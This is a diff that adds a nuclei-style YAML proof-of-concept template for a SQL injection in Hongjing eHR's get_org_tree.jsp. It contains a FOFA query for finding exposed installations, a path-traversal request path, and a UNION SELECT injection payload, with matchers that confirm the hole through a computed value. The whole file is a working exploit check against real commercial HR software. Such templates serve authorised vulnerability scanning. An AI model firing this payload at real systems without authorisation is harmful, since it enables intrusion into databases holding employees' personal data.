@@ -1,0 +1,33 @@
+id: poc-yaml-hjsoft-ehr-getorgtree-sqli
+info:
+  name: 宏景eHR get_org_tree.jsp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+variables:
+  t1: "{{rand_int(100,500)}}"
+  t2: "{{to_number(t1)*to_number(t1)*to_number(t1)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/templates/attestation/../../kq/app_check_in/get_org_tree.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      params=1=0 union select 1,2,POWER({{t1}},3),4--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<TreeNode"
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
